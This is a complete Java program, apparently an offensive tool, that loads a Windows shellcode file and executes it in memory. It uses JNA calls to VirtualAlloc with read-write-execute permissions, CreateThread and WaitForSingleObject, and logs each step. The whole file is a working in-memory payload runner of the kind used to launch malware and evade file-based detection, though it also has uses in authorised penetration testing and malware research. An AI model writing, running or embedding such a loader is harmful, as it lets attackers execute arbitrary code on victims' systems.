import com.sun.jna.*;
import java.io.*;
import java.nio.file.*;
import java.text.SimpleDateFormat;
import java.util.Arrays;
import java.util.Date;

public class ShellcodeRunner {

    public interface Kernel32 extends Library {
        Kernel32 INSTANCE = Native.load("kernel32", Kernel32.class);

        Pointer VirtualAlloc(Pointer lpAddress, int dwSize, int flAllocationType, int flProtect);
        Pointer CreateThread(Pointer lpThreadAttributes, int dwStackSize, Pointer lpStartAddress, Pointer lpParameter, int dwCreationFlags, Pointer lpThreadId);
        int WaitForSingleObject(Pointer hHandle, int dwMilliseconds);

        int MEM_COMMIT = 0x1000;
        int MEM_RESERVE = 0x2000;
        int PAGE_EXECUTE_READWRITE = 0x40;
        int INFINITE = 0xFFFFFFFF;
    }

    public static void main(String[] args) throws Exception {
        PrintStream logStream = new PrintStream(new FileOutputStream("output.log", true));
        PrintStream originalOut = System.out;
        System.setOut(new PrintStream(new MultiOutputStream(originalOut, logStream)));

        System.out.println("=======================================");
        System.out.println("[*] ShellcodeRunner started at " + timestamp());

        if (args.length < 1) {
            System.err.println("[!] Usage: java ShellcodeRunner <shellcode.bin> [args]");
            return;
        }

        String filePath = args[0];
        byte[] shellcode = Files.readAllBytes(Paths.get(filePath));

        System.out.println("[*] Loaded shellcode from: " + filePath + " (" + shellcode.length + " bytes)");

        if (args.length > 1) {
            String flags = String.join(" ", Arrays.copyOfRange(args, 1, args.length));
            System.out.println("[*] Passed flags: " + flags);
        } else {
            System.out.println("[*] No flags passed.");
        }

        // Allocate memory
        Pointer memory = Kernel32.INSTANCE.VirtualAlloc(
                Pointer.NULL,
                shellcode.length,
                Kernel32.MEM_COMMIT | Kernel32.MEM_RESERVE,
                Kernel32.PAGE_EXECUTE_READWRITE
        );

        if (memory == null) {
            System.err.println("[!] Failed to allocate memory.");
            return;
        }

        memory.write(0, shellcode, 0, shellcode.length);

        System.out.println("[*] Executing shellcode...");
        Pointer thread = Kernel32.INSTANCE.CreateThread(
                Pointer.NULL,
                0,
                memory,
                Pointer.NULL,
                0,
                Pointer.NULL
        );

        if (thread == null) {
            System.err.println("[!] Failed to create thread.");
            return;
        }

        Kernel32.INSTANCE.WaitForSingleObject(thread, Kernel32.INFINITE);
        System.out.println("[+] Shellcode finished execution.");
        System.out.println("[*] Finished at " + timestamp());
        System.out.println("=======================================\n");

        System.setOut(originalOut);
        logStream.close();
    }

    private static String timestamp() {
        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
    }

    public static class MultiOutputStream extends OutputStream {
        private final OutputStream[] streams;

        public MultiOutputStream(OutputStream... streams) {
            this.streams = streams;
        }

        public void write(int b) throws IOException {
            for (OutputStream out : streams) {
                out.write(b);
            }
        }

        public void flush() throws IOException {
            for (OutputStream out : streams) {
                out.flush();
            }
        }

        public void close() throws IOException {
            for (OutputStream out : streams) {
                out.close();
            }
        }
    }
}
